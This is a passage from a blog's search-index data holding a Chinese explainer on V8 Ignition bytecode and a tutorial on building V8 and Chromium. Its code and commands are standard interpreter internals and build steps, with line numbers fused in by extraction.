现在看看基于这些信息的源代码和字节码。12345673 0x3f5e20aafdf6 @ 0 : 09 00 LdaConstant [0]4 0x3f5e20aafdf8 @ 2 : 1f f9 Star r15 0x3f5e20aafdfa @ 4 : 02 LdaZero6 0x3f5e20aafdfb @ 5 : 1f f8 Star r27 0x3f5e20aafdfd @ 7 : 20 fe f7 Mov &lt;closure&gt;, r38 0x3f5e20aafe00 @ 10 : 55 aa 01 f9 03 CallRuntime [DeclareGlobalsForInterpreter], r1-r39 0 E&gt; 0x3f5e20aafe05 @ 15 : 92 StackCheck 从这里真正开始 produce 123456789101112131415161718//将常量池中索引1（变量名a）的值加载到累加器中。10 116 S&gt; 0x3f5e20aafe06 @ 16:09 01 LdaConstant [1]11 //将累加器的值（变量名a）加载到r1寄存器中。12 0x3f5e20aafe08 @ 18：1f f9 Star r113 //加载累加器0。14 0x3f5e20aafe0a @ 20:02 LdaZero15 //将值从累加器（0）加载到r2寄存器中。16 0x3f5e20aafe0b @ 21：1 f f 8 Star r 217 //将立即值1加载到累加器中。18 0x3f5e20aafe0d @ 23:03 01 Lda Smi [1]19 //将累加器（1）的值加载到r3寄存器中。20 0x3f5e20aafe0f @ 25：1 f f 7 Star r 321 //使用r1寄存器中的r3寄存器值（a，0,1）调用InitializeVarGlobal运行时。22 0x3f5e20aafe11 @ 27:55 ab 01 f9 03 CallRuntime [InitializeVarGlobal]，r1-r323 //将undefined设置为accumulator24 0x3f5e20aafe16 @ 32:04 LdaUndefined25 / /完成26 118 S&gt; 0x3f5e20aafe17 @ 33:96 Return 值得注意的时，在CallRuntime的情况下，需要为每个运行时确定调用约定，因此有必要相应地分配寄存器。 InitializeVarGlobal运行时调用需要以下寄存器。 r0 =要绑定的变量名称 r1 = LaunguageMode SLOPPY（正常）STRICT（严格模式）LAUNGUAGE_END（未知） r2 =要绑定的值 因此，上面的代码: 将值加载到累加器中 将值加载到寄存器中 loop 字节码执行BytecodeHandler字节码处理由BytecodeHandler完成。BytecodeHandler在v8初始化时将被生成。 以下是BytecodeHandler的示例。12345IGNITION_HANDLER(LdaZero, InterpreterAssembler) { Node* zero_value = NumberConstant(0.0); SetAccumulator(zero_value); Dispatch();} 在BytecoeHandler load zero的过程中，将累加器设置为0。实际上，每组字节码都将有一个这样的BytecodeHandler。每个BytecodeHandler通过depatch直接调用下一个BytecodeHandler。下图显示了BytecodeHandler的生成 InterpreterEntryTrampoline在Ignition终于生成了BytecodeArray之后，从使用InterpreterEntryTrampoline代码构建的代码中点燃DispatchTable of Ignition，它从BytecodeArray中检索字节码并执行相应DispatchTable的处理并转发。下图显示了Ignition的执行方式","link":"/2018/07/10/V8-Iginition-Interpreter/"},{"title":"V8 & Chrome Setup","text":"Intro: Setup of V8 &amp; Chrome V8 BuildlinuxPre Work Install Git 1apt-get install git Install depot_tools 12git clone https://chromium.googlesource.com/chromium/tools/depot_toolsexport PATH=~/depot_tools:&quot;$PATH&quot; Key Step BUILD.sh 123456gclientmkdir v8cd v8fetch v8tools/dev/v8gen.py x64.debugninja -C out.gn/x64.debug 此时编译的是最新版本的v8，若想切换分支，执行： 1234567git reset --hard +hashtools/dev/v8gen.py x64.debugninja -C out.gn/x64.debugOR ./build/install-build-deps.sh./tools/dev/gm.py x64.release WindowsPrework Visual Studio 2017 设置 git cookie Windows SDK Key STAP 打开适用于 VS 2017 的 X64 本机工具命令提示框 再次确认上一步已完成，注意不是cmd窗口12345678910git clone https://chromium.googlesource.com/chromium/tools/depot_tools.gitSET depot_tools 环境变量，将其放在存有python.exe的环境变量前或者直接置顶set DEPOT_TOOLS_WIN_TOOLCHAIN=0set GYP_MSVS_VERSION=2017mkdir v8 &amp;&amp; cd v8fetch v8cd v8gn gen --ide=vs out.gn\\x64_solutionpython tools\\dev\\v8gen.py x64.releaseninja -C out.gn\\x64.release Chrome BuildWindowsPre Work Install Git 1apt-get install git Install depot_tools 12git clone https://chromium.googlesource.com/chromium/tools/depot_toolsexport PATH=~/depot_tools:&quot;$PATH&quot; Key Step BUILD.sh12345678910set DEPOT_TOOLS_WIN_TOOLCHAIN=0set GYP_MSVS_VERSION=2017gclientmkdir chromium &amp;&amp; cd chromiumfetch chromiumgit checkout -b &lt;local-branch-name&gt; tags/&lt;tag name&gt;gclient synccd src gn gen --ide=vs out/Default ninja -C out/Default chrome Preparing Turbolizer1234cd tools/turbolizernpm inpm run-script buildpython -m SimpleHTTPServer","link":"/2018/07/01/V8-Environmental-Configuration/"}],"tags":[{"name":"Fuzz","slug":"Fuzz","link":"/tags/Fuzz/"},{"name":"Browser Explore","slug":"Browser-Explore","link":"/tags/Browser-Explore/"},{"name":"V8","slug":"V8","link":"/tags/V8/"},{"name":"Basic","slug":"Basic","link":"/tags/Basic/"},{"name":"Exploit","slug":"Exploit","link":"/tags/Exploit/"},{"name":"optimize","slug":"optimize","link":"/tags/optimize/"},{"name":"Kernel","slug":"Kernel","link":"/tags/Kernel/"}],"categories":[{"name":"fuzz","slug":"fuzz","link":"/categories/fuzz/"},{"name":"Browser Explore","slug":"Browser-Explore","link":"/categories/Browser-Explore/"},{"name":"Linux Kernel","slug":"Linux-Kernel","link":"/categories/Linux-Kernel/"},{"name":"V8","slug":"Browser-Explore/V8","link":"/categories/Browser-Explore/V8/"},{"name":"Basic","slug":"Browser-Explore/Basic","link":"/categories/Browser-Explore/Basic/"},{"name":"Basic","slug":"Browser-Explore/V8/Basic","link":"/categories/Browser-Explore/V8/Basic/"},{"name":"Exploit","slug":"Browser-Explore/V8/Exploit","link":"/categories/Browser-Explore/V8/Exploit/"},{"name":"optimize","slug":"Browser-Explore/V8/optimize","link":"/categories/Browser-Explore/V8/optimize/"},{"name":"Exploit","slug":"Browser-Explore/Exploit","link":"/categories/Browser-Explore/Exploit/"},{"name":"optimize","slug":"Browser-Explore/optimize","link":"/categories/Browser-Explore/optimize/"}]}